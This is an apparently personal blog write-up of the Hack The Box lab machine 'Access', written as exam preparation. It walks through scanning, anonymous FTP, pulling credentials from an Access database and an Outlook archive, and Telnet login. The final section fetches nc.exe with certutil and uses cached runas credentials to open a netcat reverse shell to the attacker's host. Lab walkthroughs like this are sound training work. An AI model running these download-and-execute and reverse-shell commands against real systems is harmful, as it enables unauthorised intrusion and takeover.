---
title: "HTB Access"
date: 2026-05-16 17:03 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Easy]
image: /assets/img/posts/access/access.png
---
**HTB Access** is a Windows machine that starts with anonymous `FTP` access to download a `Microsoft Access Database` and a password-protected zip, extracts credentials from the `.mdb` file to unlock a `Microsoft Outlook PST` archive containing a plaintext password, connects via `Telnet` as the `security` user, and escalates to `Administrator` by abusing cached `runas /savecred` credentials to execute a reverse shell.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.38.242 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE                                                                                                                                         
21/tcp open  ftp                                                                                                                                             
23/tcp open  telnet                                                                                                                                          
80/tcp open  http
```
- NSE Scripts & Version
```
nmap -sCV -p21,23,80 10.129.39.10 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
Host script results:
|_clock-skew: -10s
```
## ftp
### get-all
```
wget -r -nH --cut-dirs=1 --no-passive-ftp ftp://anonymous:anonymous@10.129.39.10/
```
### Microsoft Access Database
```
file backup.mdb 
backup.mdb: Microsoft Access Database
```
```
➜  ftp mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos ac
c_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessd
ata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additio
ndata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHEC
KEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTe
mp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL oper
atecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSIN
FO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantms
g worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dba
pp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers O
fflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplat
e FaceTempEx FingerVeinEx TEMPLATEEx 
➜  ftp mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
➜  ftp 7z x Access\ Control.zip
```
### Microsoft Outlook Personal Storage
```
➜  ftp file Access\ Control.pst 
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
➜  ftp readpst "Access Control.pst"
Opening PST file and indexes...
Processing Folder "Deleted Items"
"Access Control" - 2 items done, 0 items skipped.
```
```
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
## telnet
```
telnet $ip 23 #user-flag
```
```
C:\Users\security\Desktop>net user administrator
Password required            No
```
```
Directory of C:\Users\Public\Desktop
08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
```
![crds](/assets/img/posts/access/creds.png)
## runas (Administrator)
```
uv run -m http.server 9999
certutil -urlcache -split -f http://10.10.14.186:9999/nc.exe nc.exe
```
```
rlwrap -cAr nc -lvnp 9001
runas /user:Administrator /savecred "nc.exe 10.10.14.186 9001 -e cmd.exe"
```
```
➜  ftp rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.39.10] 49165
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
C:\Windows\system32>whoami
whoami
access\administrator
```
